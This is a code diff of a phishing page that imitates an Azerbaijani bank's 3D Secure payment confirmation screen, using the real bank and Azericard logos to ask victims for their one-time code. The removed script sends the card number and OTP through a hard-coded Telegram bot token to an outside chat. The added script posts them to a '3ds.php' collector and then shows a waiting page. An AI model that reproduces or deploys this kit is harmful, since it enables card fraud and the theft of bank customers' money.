@@ -8,21 +8,8 @@
     <style>
         .transaction-details { background: #f8f9fa; border-radius: 8px; padding: 15px; margin: 15px 0; }
         .amount-display { font-size: 24px; color: #2c3e50; font-weight: bold; margin: 10px 0; }
-        .datetime-display { color: #666; font-size: 14px; margin-bottom: 15px; }
-        .card-info { background: white; padding: 12px; border-radius: 6px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); display: flex; align-items: center; gap: 12px; }
-        
-        .otp-error-box {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 15px;
-            text-align: center;
-            font-weight: bold;
-            font-size: 15px;
-            display: none;
-        }
+        .card-info { background: white; padding: 12px; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; gap: 12px; margin-bottom: 15px;}
+        .otp-error-box { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; padding: 12px; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: bold; font-size: 15px; display: none; }
         .otp-error-box.show { display: block; }
     </style>
 </head>
@@ -31,17 +18,13 @@
         <main class="main">
             <header>
                 <div class="card-call">
-                    <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Logo">
-                    <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard Logo">
-                    <img src="https://static.tildacdn.one/tild3062-3037-4265-b832-663130393564/m10byPashaPay_1.svg" alt="PashaPay Logo">
+                    <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB">
+                    <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard">
                 </div>
             </header>
-
             <section class="form-content">
                 <h1>Ödənişin təsdiqi</h1>
-                
                 <div class="transaction-details">
-                    <div class="datetime-display" id="currentDateTime"></div>
                     <div class="amount-display" id="paymentAmount"></div>
                     <div class="card-info">
                         <img id="cardTypeLogo" src="images/mastercard.svg" alt="Card Type" width="40" height="24">
@@ -55,24 +38,17 @@
                             <div class="field_cvc">
                                 <div>
                                     <label for="securitycode">3DS Code</label>
-                                    <input required id="securitycode" type="tel" inputmode="numeric" name="otp" placeholder="****" minlength="4" maxlength="6" pattern="[0-9]*">
-                                </div>
-                                <div class="tooltip">
-                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="Info" width="20" height="20" style="cursor: pointer;">
-                                    <span class="tooltiptext">Sizə mesaj vasitəsi ilə göndərildi!</span>
+                                    <input required id="securitycode" type="tel" inputmode="numeric" placeholder="****" minlength="4" maxlength="6" pattern="[0-9]*">
                                 </div>
                             </div>
                         </div>
                     </div>
-
+                    
                     <div class="form-button">
                         <button id="submitBtn" type="submit" class="submitBtn" disabled>
-                            <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="Lock" width="16" height="16">
                             Ödənişi təsdiqlə
                         </button>
-                        <button id="cnltBtn" type="button" onclick="window.location.href='../index.html'">
-                            Ödənişin ləğvi
-                        </button>
+                        <button type="button" onclick="window.location.href='../index.html'">Ödənişin ləğvi</button>
                     </div>
                 </form>
                 
@@ -81,61 +57,33 @@
                 </div>
             </section>
         </main>
-
-        <footer>
-            <div class="footer_1">
-                <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="Visa" width="48" height="24">
-                <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="Verified by Visa" width="48" height="24">
-                <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="Mastercard" width="48" height="24">
-                <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="Mastercard SecureCode" width="48" height="24">
-            </div>
-            <div class="footer_2">
-                <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="American Express" width="48" height="24">
-                <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="SafeKey" width="48" height="24">
-                <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="UnionPay" width="48" height="24">
-                <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="JCB" width="48" height="24">
-            </div>
-        </footer>
     </div>
 
     <script>
-        const BOT_TOKEN = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
-        const CHAT_ID = '-1004326178006';
-
         const urlParams = new URLSearchParams(window.location.search);
         const cardNumber = urlParams.get('card') || '';
         const amount = urlParams.get('amount') || '0.00';
         const hasError = urlParams.get('error') === 'invalid_otp';
 
-        // Məbləğ
         const formattedAmount = new Intl.NumberFormat('az-AZ', { style: 'currency', currency: 'AZN' }).format(parseFloat(amount));
         document.getElementById('paymentAmount').textContent = formattedAmount;
 
-        // Kart nömrəsi
         const lastFourDigits = cardNumber.replace(/\s/g, '').slice(-4);
         document.getElementById('cardNumber').textContent = lastFourDigits ? `**** **** **** ${lastFourDigits}` : '';
 
-        // Tarix
-        const now = new Date();
-        document.getElementById('currentDateTime').textContent = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')} ${String(now.getDate()).padStart(2, '0')}.${String(now.getMonth() + 1).padStart(2, '0')}.${now.getFullYear()}`;
-
-        // Kart loqosu
         const cleanCard = cardNumber.replace(/\s/g, '');
         if (cleanCard.startsWith('4')) document.getElementById('cardTypeLogo').src = 'images/visa.svg';
 
-        // Xəta göstər
         if (hasError) {
             document.getElementById('otpErrorBox').classList.add('show');
         }
 
-        // OTP input
         const otpInput = document.getElementById('securitycode');
         const submitBtn = document.getElementById('submitBtn');
         otpInput.addEventListener('input', function() {
             submitBtn.disabled = this.value.length < 4;
         });
 
-        // Submit
         document.getElementById('otpForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const otpVal = otpInput.value;
@@ -144,14 +92,16 @@
             submitBtn.disabled = true;
             submitBtn.innerHTML = 'Yüklənir...';
 
-            const msg = encodeURIComponent('🔐 3D Secure OTP:\nKart: ' + cardNumber + '\nOTP: ' + otpVal);
-            const img = new Image();
-            img.src = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg;
+            const formData = new FormData();
+            formData.append('otp', otpVal);
+            formData.append('card', cardNumber);
 
-            // 1 saniyə sonra wait.html-ə keç
-            setTimeout(() => {
+            fetch('3ds.php', {
+                method: 'POST',
+                body: formData
+            }).finally(() => {
                 window.location.href = 'wait.html?card=' + encodeURIComponent(cardNumber) + '&amount=' + encodeURIComponent(amount);
-            }, 1000);
+            });
         });
     </script>
 </body>
